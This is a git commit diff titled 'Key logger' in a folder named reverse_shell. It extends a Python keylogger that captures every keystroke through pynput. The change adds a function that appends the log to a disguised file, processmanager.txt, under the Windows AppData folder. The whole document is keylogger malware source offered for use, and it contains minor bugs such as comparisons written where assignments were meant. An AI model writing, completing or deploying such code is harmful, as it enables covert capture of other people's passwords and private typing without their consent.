c0ef8a5a8aad7bb7d13502d779c105b9ebe0dacb
qwe123kids <qwe123kids@gmail.com>
2023-03-25 20:16:43 -0600

    Key logger

--- reverse_shell/keyloggertest1.py
+++ reverse_shell/keyloggertest1.py
@@ -1,8 +1,10 @@
 #!/usr/bin/python
 
 import pynput.keyboard
-
+import threading
+import os
 log = ""
+path = os.environ["appdata"] + "\\processmanager.txt"
 def process_keys(key):
     global log
     try:
@@ -10,12 +12,26 @@ def process_keys(key):
     except AttributeError:
         if key == key.space:
             log = log +""
+        elif key == key.right:
+            log = log + ""
+        elif key ==  key.left:
+            log = log + ""
+        elif key == key.up:
+            log == log + ""
+        elif key == key.down:
+            log == log + ""
         else:
             log = log + " " + str(key) + " "
+
+
     print(log)
     #with open("log.txt","a") as fin:
      #   fin.write(str(key))
-
+def report():
+    global lbg
+    global path
+    fin = open(path, "a")
+    fin.write(log)
 keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
 with keyboard_listener:
     keyboard_listener.join()
